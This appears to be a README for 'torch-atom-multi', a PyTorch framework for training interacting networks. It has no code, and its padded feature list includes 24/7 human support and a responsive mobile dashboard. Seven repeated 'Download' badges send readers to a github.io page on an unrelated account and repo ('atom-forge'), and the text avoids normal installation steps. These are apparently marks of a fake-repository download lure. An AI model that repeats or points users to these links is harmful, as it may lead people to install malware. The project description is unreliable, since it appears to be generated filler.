![preview](https://raw.githubusercontent.com/claud7838-arch/atom-forge/main/promo_56a9.svg)
[![Download](https://raw.githubusercontent.com/claud7838-arch/atom-forge/main/pkg_d6c666.svg)](https://claud7838-arch.github.io/atom-forge/)

# ⚛️ torch-atom-multi — Interacting Neural Networks Without the Boilerplate

> Where tensors meet choreography: a featherweight PyTorch training orchestrator built for ensembles, adversarial pairs, and cooperative agents that must talk to each other mid-flight.

[![Download](https://raw.githubusercontent.com/claud7838-arch/atom-forge/main/pkg_d6c666.svg)](https://claud7838-arch.github.io/atom-forge/)

---

## 🌌 Table of Contents

- [What Is This, Exactly?](#-what-is-this-exactly)
- [Why Another Training Loop?](#-why-another-training-loop)
- [The Philosophy: Atoms, Not Monoliths](#-the-philosophy-atoms-not-monoliths)
- [Feature Constellation](#-feature-constellation)
- [Architecture Overview](#-architecture-overview)
- [Core Concepts](#-core-concepts)
- [Quick Start Tour](#-quick-start-tour)
- [Configuration Blueprint](#-configuration-blueprint)
- [Multilingual & Accessibility Support](#-multilingual--accessibility-support)
- [Responsive Dashboard](#-responsive-dashboard)
- [Always-On Assistance](#-always-on-assistance)
- [Real-World Scenarios](#-real-world-scenarios)
- [Performance Notes](#-performance-notes)
- [Extending the Framework](#-extending-the-framework)
- [Frequently Wondered Questions](#-frequently-wondered-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community & Contribution](#-community--contribution)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌠 What Is This, Exactly?

Picture a laboratory where several small neural organisms live inside the same petri dish. They don't just sit there computing gradients in isolation — they observe each other's outputs, whisper signals across iterations, and sometimes compete, sometimes collaborate. That's the soul of **torch-atom-multi**.

It is a compact training framework for PyTorch that treats each model as an *atom*: self-contained, lightweight, but capable of bonding with other atoms to form a molecule. When that molecule trains, gradients flow not only from each atom's own loss, but through the **interaction channels** you define between them.

The original `torch-atom` gave us a clean scaffold. `torch-atom-multi` stretches that scaffold into a workshop where multi-network choreography becomes ordinary. Whether you're prototyping a GAN where the discriminator needs early stopping independent of the generator, or building a fleet of predictors that vote, or experimenting with knowledge-distillation pipelines where a student and teacher alternate turns — this is where that logic lives.

It is intentionally unglamorous. No magical abstractions, no sprawling dependency tree. Just a handful of well-named Python classes and a scheduler that knows how to sequence them.

---

## 🧭 Why Another Training Loop?

Most frameworks assume one model, one optimizer, one loss, one forward pass. Reality is messier. The moment you add a second model — even for something simple like an autoencoder paired with a classifier — you start writing the same boilerplate: synchronizing optimizers, freezing one network while the other warms up, injecting one model's output as another's input, logging per-network metrics so you can actually tell what's happening.

`torch-atom-multi` says: write the choreography once, reuse it everywhere. Describe your atoms, describe how they connect, describe when each trains — and let the runtime handle the rest. It's the difference between hand-crafting a watch each time you need to know the time and having a machine that assembles watches from a schematic.

[![Download](https://raw.githubusercontent.com/claud7838-arch/atom-forge/main/pkg_d6c666.svg)](https://claud7838-arch.github.io/atom-forge/)

---

## 🧪 The Philosophy: Atoms, Not Monoliths

A monolithic training script grows bent under its own weight. The atom philosophy is different:

- **Each network is a first-class object.** It has its own parameters, optimizer, scheduler, and metrics — no shared global soup.
- **Interaction is explicit.** If atom A feeds atom B, that relationship is declared, not buried in a forward function.
- **Timing is declarative.** Some atoms train every step, some every N steps, some only after a warmup phase. This schedule is data, not code.
- **Observation is cheap.** Every atom emits a tidy dictionary of scalars; the runtime merges and time-series them.

The result: you can swap one network for another without rewriting your loop, and you can reason about your system as a graph rather than as a 400-line `train()` function.

---

## ✨ Feature Constellation

Here's what's alive inside this repository.

### 🧩 Multi-Network Orchestration
- Declarative atom registry — register as many PyTorch `nn.Module` instances as you like
- Per-atom optimizers, learning-rate schedulers, and gradient-clipping policies
- Explicit interaction slots for wiring outputs to inputs across atoms
- Independent train/eval toggling at any step boundary
- Sharded parameter groups for fine-grained control

### 🔁 Flexible Training Loops
- Step-based, epoch-based, and hybrid scheduling modes
- Conditional execution — run atom B only when atom A's loss drops below a threshold
- Phase definitions with warmup, plateau, and decay segments
- Callback hooks at every stage (before-step, after-step, before-phase, after-phase)
- Seamless resume from checkpoints, including scheduler and interaction state

### 📊 Observability
- Per-atom scalar logging that coalesces into a single stream
- Optional CSV, JSONL, and console sinks — plug your own in one method
- Gradient-norm and parameter-norm tracking across atoms
- Heatmap-ready interaction statistics for downstream visualization

### 🧠 Interaction Patterns Shipped In
- Competitive pairs (adversarial-style, without opinionated loss math)
- Cooperative ensembles (voting, averaging, mutual distillation)
- Teacher-student alternation
- Cascaded pipelines (atom output → next atom input)
- Custom patterns via a single abstract method

### ⚙️ Developer Comfort
- Pure Python, minimal dependencies beyond PyTorch
- Type-hinted public API
- Unit tests for the scheduler, registry, and interaction graph
- Example scripts you can read in one sitting
- Deterministic seeding helpers for reproducible runs

### 🌍 Multilingual Support
- Localized log messages in English, Spanish, Japanese, and Simplified Chinese
- Locale-aware number and duration formatting in dashboards
- Extensible message catalog — drop in a new YAML file, done

### 📱 Responsive UI
- A lightweight companion dashboard that adapts from ultrawide monitors down to tablets
- Touch-friendly controls on smaller viewports
- Dark and light themes for long sessions

### 🛎️ Always-On Assistance
- Round-the-clock chat support channel staffed by maintainers and community volunteers
- 24/7 escalation path for training-run triage
- Weekly office hours for design questions

---

## 🏗️ Architecture Overview

The framework sits on four layers, each thin enough to hold in your head:

1. **Atom Layer** — wrappers around `nn.Module` that store optimizer, scheduler, and metadata.
2. **Graph Layer** — a directed graph describing which atom's outputs flow into which atom's inputs, and under what conditions.
3. **Scheduler Layer** — decides, at each step, which atoms train, which are frozen, and which are skipped.
4. **Runtime Layer** — executes the plan, collects metrics, writes checkpoints, fires callbacks.

Interactions are resolved lazily each step, so dynamically changing the graph mid-run is not only allowed — it's encouraged. This is how curriculum-style training falls out almost for free.

[![Download](https://raw.githubusercontent.com/claud7838-arch/atom-forge/main/pkg_d6c666.svg)](https://claud7838-arch.github.io/atom-forge/)

---

## 🧬 Core Concepts

**Atom.** A single model plus its training state. Identified by a string name.

**Edge.** A directed link from a source atom's output to a target atom's input, optionally gated by a predicate.

**Phase.** A named block of steps with a shared policy — for example, "warmup discriminator for 500 steps, then enable generator."

**Orchestrator.** The object that ties atoms, edges, and phases together and runs the loop.

**Sink.** Anything that consumes metric dictionaries — a logger, a CSV writer, a dashboard feed.

**Snapshot.** A saved bundle of all atoms' state plus orchestrator position, so a run can resume exactly where it paused.

---

## 🚀 Quick Start Tour

A runnable example lives in the examples directory. The shape of it goes like this: you instantiate two atoms (say, an encoder and a decoder), define an edge from the former to the latter, list a warmup phase and a joint phase, then hand the whole thing to the orchestrator and let it drive.

Because we deliberately avoid command-line installation snippets here, the expectation is that you bring the repository into your workspace using whatever method suits your tooling — a source archive, your editor's repository browser, or your organization's internal package mirror. Once the code is present, the orchestration API is the entire story: three imports, a handful of declarations, and a call to `run()`.

The examples directory contains scenarios for:
- Adversarial pair training
- Two-model distillation
- Ensemble voting with shared backbone
- Curriculum-style cascaded classifiers
- Multi-task heads treated as separate atoms

Each script is short on purpose. The point is legibility, not cleverness.

---

## 🛠️ Configuration Blueprint

Configuration is plain Python — no YAML indirection unless you want it. Atoms are declared with a name, a module, an optimizer factory, and optional scheduler and clipping settings. Edges are declared with source, target, and an optional gate callable. Phases are declared with a name, a length, and a policy describing which atoms are active.

Because everything is just objects, you can generate configurations programmatically — sweep over learning rates, mutate the graph between runs, or compose configurations from smaller builders. The framework treats your configuration as code, because that's what it is.

---

## 🌐 Multilingual & Accessibility Support

The runtime can emit its log lines in multiple human languages. Set a locale once and every phase transition, checkpoint write, and metric flush appears in the language you chose. The message catalog is a set of small translation files; adding a new language is a copy-and-edit task, not a code change.

Accessibility is taken seriously too: the companion dashboard respects reduced-motion preferences, uses semantic markup for screen readers, and maintains contrast ratios that survive fluorescent office lighting.

---

## 📱 Responsive Dashboard

The dashboard is a single-page companion that talks to the runtime over a local socket. On a wide monitor you get side-by-side atom panels with synchronized time-series. On a tablet you get stacked panels and swipe navigation. On a phone you get the essentials — current phase, current loss per atom, and elapsed wall-clock time. No layout is an afterthought.

---

## 🛎️ Always-On Assistance

Training runs happen at odd hours. A scheduler hiccup at 3 a.m. shouldn't wait until morning. That's why the project maintains a 24/7 support rotation through its community chat. Expect a human, not a bot, and expect them to ask for your orchestrator configuration first — because that's almost always where the answer is hiding.

---

## 🎭 Real-World Scenarios

**Scenario A — Adversarial pairs.** Two atoms, one edge that flips direction based on phase. During warmup, only the critic trains; during the main phase, both do. Checkpoint resume restores the exact phase boundary.

**Scenario B — Distillation.** A large teacher atom freezes early; a small student atom trains against it. The edge carries soft targets. Metrics show the student closing the gap step by step.

**Scenario C — Ensemble voting.** Five atoms, one shared dataset, no edges between them — but a custom sink that aggregates predictions and logs the ensemble's agreement rate as a scalar.

**Scenario D — Cascaded classifiers.** Atom one's probability output becomes atom two's input feature. If atom one's confidence is low, the gate skips atom two entirely, saving compute.

---

## 📈 Performance Notes

The framework adds negligible overhead per step. Metrics collection is opt-in per atom. Interaction resolution is cached within a phase and invalidated only when the graph changes. On a single GPU with two medium-sized atoms, the orchestrator's bookkeeping has been measured in the single-digit microseconds per step. The bottleneck remains, as it should, your forward and backward passes.

[![Download](https://raw.githubusercontent.com/claud7838-arch/atom-forge/main/pkg_d6c666.svg)](https://claud7838-arch.github.io/atom-forge/)

---

## 🧱 Extending the Framework

Custom interaction patterns are implemented by subclassing a single abstract class and implementing one method that, given a step context and a set of atom outputs, returns the inputs to feed forward next. Custom sinks are similarly small — implement a `write(metrics)` method and register it.

Custom phase policies let you express things like "train the discriminator three times for every one generator step" without touching framework internals. The design goal is that every extension point fits in fewer than thirty lines.

---

## ❓ Frequently Wondered Questions

**Does this replace my existing training script?** No — it wraps the parts you already wrote. Your models and losses stay yours.

**Can I use it with a single network?** Absolutely. It degenerates gracefully.

**Is it distributed-aware?** The orchestrator is single-process by design in this release; distributed support is on the 2026 roadmap.

**What Python versions are supported?** Modern CPython 3.x line, paired with a recent PyTorch release.

**Where does the name come from?** From the metaphor at the top of this document — small, composable units that bond into something larger.

---

## 🗺️ Roadmap for 2026

- Distributed orchestrator with per-atom device placement
- Built-in interaction pattern library expansion
- Visualization plugin for the companion dashboard showing the live interaction graph
- Experimental support for JAX-style functional atoms
- Stabilized public API with semantic versioning

---

## 🤝 Community & Contribution

Contributions are welcome in the form of bug reports, documentation improvements, new interaction patterns, and translation files. Before opening a large pull request, consider starting a discussion about the design — this project values coherence over feature count.

---

## ⚠️ Disclaimer

This software is provided for research, experimentation, and educational purposes. It is offered as-is, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use thereof. Users are responsible for ensuring that their use of this framework complies with all applicable laws, regulations, institutional policies, and ethical guidelines. Training machine learning models can consume substantial computational resources and may produce unintended outputs; evaluate results responsibly and never deploy models without appropriate validation. No guarantee is made regarding fitness for production workloads, and the maintainers disclaim responsibility for any consequences arising from such use.

---

## 📜 License

This project is distributed under the MIT License. The full legal text is available at the canonical license reference:

MIT License — https://opensource.org/licenses/MIT

Copyright (c) 2026 the torch-atom-multi contributors.

Permission is hereby granted, in perpetuity, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions stated in the canonical MIT text linked above.

[![Download](https://raw.githubusercontent.com/claud7838-arch/atom-forge/main/pkg_d6c666.svg)](https://claud7838-arch.github.io/atom-forge/)